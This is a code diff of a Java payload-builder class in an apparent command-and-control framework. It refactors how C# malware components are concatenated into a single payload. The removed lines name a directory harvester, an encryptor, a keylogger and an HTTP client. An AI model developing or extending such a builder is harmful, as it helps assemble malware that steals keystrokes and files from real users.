@@ -3,13 +3,18 @@ package c2.file;
 import java.io.BufferedReader;
 import java.io.FileReader;
 import java.io.IOException;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 
 public class CSharpPayloadBuilder {
-	public static String buildPayload(String path) throws IOException {
-		String args[] = {"common\\directory_harvester.cs", "common\\encryptor.cs", "common\\cs_keylogger.cs", "common\\client.cs", "http_client.cs"};
+	//TODO: Make configurable
+	private static final Path CSHARP_PAYLOAD_PATH = Paths.get("config", "csharp_staging", "csharp_payload");
+	
+	public static String buildConfigurablePayload(Path masterImport, String commaListOfSrcFiles) throws IOException {
+		String args[] = commaListOfSrcFiles.split(",");
 		StringBuilder sb = new StringBuilder();
 		
-		BufferedReader br = new BufferedReader(new FileReader(path + "\\common\\master_import.cs"));
+		BufferedReader br = new BufferedReader(new FileReader(CSHARP_PAYLOAD_PATH.resolve(masterImport).toFile()));
 		String line;
 		while((line = br.readLine()) != null) {
 			sb.append(line);
@@ -18,8 +23,7 @@ public class CSharpPayloadBuilder {
 		br.close();
 		
 		for(String arg : args) {
-			String fullPath = path + "\\" + arg;
-			br = new BufferedReader(new FileReader(fullPath));
+			br = new BufferedReader(new FileReader(CSHARP_PAYLOAD_PATH.resolve(Paths.get(arg)).toFile()));
 			while((line = br.readLine()) != null) {
 				if(line.startsWith("using ")) {
 					continue;
